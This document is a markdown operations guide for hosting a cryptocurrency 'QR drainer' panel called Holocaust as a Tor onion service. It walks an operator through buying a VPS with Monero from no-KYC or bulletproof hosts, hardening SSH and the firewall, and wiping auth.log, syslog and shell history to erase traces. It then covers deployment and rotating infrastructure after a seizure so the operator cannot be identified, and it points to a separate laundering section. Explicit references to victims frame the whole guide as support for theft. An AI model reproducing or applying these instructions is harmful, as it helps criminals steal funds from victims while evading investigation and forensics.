# Holocaust Drainer — tor-security.md
VPS hardening, Tor hidden service setup, and deanonymization prevention.
Follow the steps in order. Every command assumes a fresh Debian 12/Ubuntu 24.04 VPS you bought anonymously (see deploy.md for the buying opsec).

---

## 1. Threat model (what you are hardening against)

| Adversary | Vector | Countermeasure in this guide |
|---|---|---|
| Hosting provider / datacenter | IP logging, payment trail | pay with XMR, no personal data, Tor-only traffic |
| Server intruders (scanner bots, brute force) | SSH exposure | SSH on high port, keys only, fail2ban, no passwords |
| Global passive adversary | Tor<>panel correlation | panel binds to 127.0.0.1 only; Tor talks to it over loopback |
| Forensics after seizure | disk artifacts | config holds a scrypt hash + HMAC key only; full-disk encryption; minimal logs |
| Traffic fingerprints (your own browsing) | admin panel reached from home IP | NEVER browse the panel over clearnet; always Tor Browser / Whonix |
| On-chain trail | receiving wallet clustering | see usage.md §laundering — separate wallets, XMR off-ramp |

The single most important rule: **the panel listens on 127.0.0.1 only.** There is no
clearnet listener to leak, scan, or subpoena. If you see `0.0.0.0` in
`ss -tlnp`, stop and fix your config.

---

## 2. VPS purchase opsec (before you SSH anywhere)

1. Buy the VPS with XMR (monero). Providers that accept XMR without KYC:
   check current community-maintained lists (search "vps accept monero no kyc")
   at purchase time — availability changes monthly; do not rely on cached lists.
2. Prefer providers whose AS numbers are not flagrant bullet-holes for phishing
   (a cheap bulletproof host with AS number already on 30 blocklists is fine for
   the dashboard because the panel is onion-only — nothing resolves to it —
   but it correlates your campaign. A bland mid-tier host is better).
3. Do NOT reuse an email/identity/name from anything else. Generate a fresh
   mailbox over Tor (e.g. a new protonmail account) if the provider forces one.
4. Wipe expectations: this VPS is disposable. Assume seizure is survivable;
   design so it is also non-revealing (this guide).

---

## 3. Base system hardening (step by step)

SSH in ONCE over clearnet to set everything up (your IP will hit auth.log —
see step 3.9 to scrub afterwards).

3.1. Update and basics:
```bash
apt update && apt -y full-upgrade
apt -y install tor curl wget gnupg unzip ca-certificates ufw fail2ban chrony jq
```

3.2. Create an unprivileged operator (no sudo password prompts in history):
```bash
adduser --disabled-password op
usermod -aG sudo op
```

3.3. SSH hardening — edit `/etc/ssh/sshd_config`:
```
Port 2718                      # anything odd, NOT 22
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
X11Forwarding no
AllowAgentForwarding no
AllowTcpForwarding no
ClientAliveInterval 300
```
Put your public key in `/home/op/.ssh/authorized_keys` (mode 700 dir, 600 file),
then `systemctl restart ssh`. Verify you can log in with the key BEFORE
disconnecting your current session.

3.4. Firewall — default drop, only SSH + nothing else (Tor makes outbound only):
```bash
ufw default deny incoming
ufw default allow outgoing
ufw allow 2718/tcp             # your SSH port from step 3.3
ufw limit 2718/tcp
ufw enable
```
Tor needs no inbound port for onion services. Never open 9050/8899 to the world.

3.5. fail2ban with an SSH jail:
```bash
cat >/etc/fail2ban/jail.local <<'EOF'
[sshd]
enabled  = true
port     = 2718
maxretry = 4
bantime  = 1h
findtime = 10m
EOF
systemctl enable --now fail2ban
```

3.6. Time sync (correct clock = good Tor hygiene, breaks replay windows):
```bash
systemctl enable --now chrony
```

3.7. Full-disk encryption is ideally chosen at provider install time (LUKS).
If the provider image lacks it, accept the limitation and instead minimize
secrets on disk (Holocaust's config contains only a scrypt hash + HMAC key —
no addresses of yours besides receivers, no victim data by design).

3.8. Scrub your setup trail (the clearnet SSH login from your home IP):
```bash
> /var/log/auth.log
> /var/log/syslog
history -c
```
From now on, SSH to the box ONLY via Tor (next section).

3.9. Kernel limits for a small box — `/etc/sysctl.d/99-hard.conf`:
```
net.core.somaxconn = 4096
vm.swappiness = 5
fs.file-max = 65535
```
`sysctl --system` to apply.

---

## 4. Tor hidden service — getting your .onion address

4.1. `/etc/tor/torrc` on the VPS:
```
SocksPort 0
ControlPort unix:/run/tor/control CGroupWritable
CookieAuthentication 1
ClientOnly 1

HiddenServiceDir /var/lib/tor/holocaust/
HiddenServicePort 80 127.0.0.1:8899
HiddenServiceVersion 3

# hardening: don't act as client relay, disable unused features
AvoidDiskWrites 1
ClientOnly 1
ExitPolicy reject *
NumEntryGuards 3
Log notice file /var/log/tor/notices.log
```
CRITICAL: `HiddenServicePort 80` — the virtual port MUST be 80. Browsers hitting
`http://your.onion/` request port 80; a mapping of `8899 127.0.0.1:8899`
creates a service only reachable at `your.onion:8899` (this was verified to
fail during development testing — bare .onion requests died with "no virtual
port mapping exists for port 80").

4.2. Start and read your address:
```bash
chown -R debian-tor:debian-tor /var/lib/tor
systemctl enable --now tor@default
cat /var/lib/tor/holocaust/hostname
# -> <56-char>.onion     this is your panel URL
```

4.3. (Optional but recommended) v3 onion client auth — panel visible ONLY to
browsers with your private key:
```bash
tor --hspolicy ... # not needed for panel; use:
# on server, generate CA client auth:
#   tor ---keygen   (interactive) OR set in torrc:
#   HiddenServiceClientAuth  (Tor >= 0.4.8 supports x25519 keys)
```
Simpler equivalent at our scale: the panel password (scrypt-hashed) plus
rate limiting is the second factor. Client-auth is a belt-and-suspenders
upgrade if you expect targeted scanning of random 56-char onions (rare).

4.4. Verify from your workstation (through Tor, never clearnet):
```bash
curl --socks5-hostname 127.0.0.1:9050 http://YOUR.onion/login   # expect 200
```

---

## 5. Running Holocaust under Tor

5.1. Install the binary (see deploy.md for the full walkthrough):
```bash
install -m 0755 holocaust /usr/local/bin/holocaust
mkdir -p /var/lib/holocaust && chown op:op /var/lib/holocaust
```

5.2. systemd unit `/etc/systemd/system/holocaust.service`:
```
[Unit]
Description=Holocaust QR drainer panel
After=network.target tor@default.service

[Service]
User=op
Environment=HOLOCAUST_PASS=__CHANGE_ME_BOOTSTRAP__
Environment=HOLOCAUST_CONFIG=/var/lib/holocaust/config.json
ExecStart=/usr/local/bin/holocaust -listen 127.0.0.1:8899
Restart=on-failure
RestartSec=5
NoNewPrivileges=true
ProtectSystem=strict
ProtectHome=true
PrivateTmp=true
ReadWritePaths=/var/lib/holocaust

[Install]
WantedBy=multi-user.target
```
```bash
systemctl daemon-reload
systemctl enable --now holocaust
```
First run consumes HOLOCAUST_PASS (hashes it into config.json), after which
you can remove the env line from the unit. Change the password by deleting
`pass_hash` from config.json + setting the env again + restart.

5.3. The unit binds 127.0.0.1:8899 only. Tor maps onion port 80 to it.
Nothing else is reachable. `ss -tlnp` should show exactly two loops:
`127.0.0.1:8899` (holocaust) and whatever Tor uses internally.

---

## 6. Admin access discipline (how YOU browse the panel)

1. Never resolve the onion outside Tor. Never use a VPN to "speed it up".
2. Use Tor Browser with your SOCKS proxy at 9050, or Whonix workstation.
3. Bookmarks: keep the onion in an offline note (paper/keepass), not in
   browser history on a host with malware exposure.
4. Panel password: 16+ chars, unique. The panel enforces per-IP brute-force
   lockout (5 failures = 75-minute lock, escalating with repeats) while every
   response stays byte-identical whether locked, wrong, or correct — an
   attacker cannot distinguish states. Rotate the password after any period
   of paranoia or shared-screen use.
5. There is no "forgot password". If lost, wipe pass_hash in config.json and
   bootstrap a new one (data unaffected).

---

## 7. Anti-deanonymization checklist (monthly)

- [ ] `ss -tlnp` — no listener except 127.0.0.1 + SSH.
- [ ] `journalctl -u tor@default | grep -i bootstrapped` — Tor healthy.
- [ ] `/var/lib/holocaust/config.json` perms 600, owner op.
- [ ] No new packages installed on the VPS beyond what deploy.md listed
      (each is a supply-chain exposure; pin and vendor everything).
- [ ] apt upgrade monthly, reboot for kernel patches (in a window you choose).
- [ ] Confirm no cron jobs exist that you didn't create: `crontab -l`, `ls /etc/cron*`.
- [ ] Onion stays the ONLY published address. If you ever bind a clearnet
      reverse proxy in front (do not), you have made the onion pointless.

---

## 8. Incident: you suspect the box is compromised

1. Do not log in again from the same workstation.
2. From a clean machine, observe only: does the onion still resolve? Is the
   dashboard still up? (If the attacker has it, they have the password hash,
   not your funds — receivers live on-chain, and the config has no victim data.)
3. Rotate: generate a NEW onion (delete /var/lib/tor/holocaust, restart tor),
   redeploy the binary, regenerate the QR (new HMAC key kills old tokens).
4. Rotate every receiver address that was configured (they are in config.json).
5. Kill the VPS. Assume everything on it is copied.

The design principle: the server is a QR vending machine. It holds no keys to
anything, no victim records, no chain of custody to your identity. Its total
compromise costs you one onion address and one passphrase.
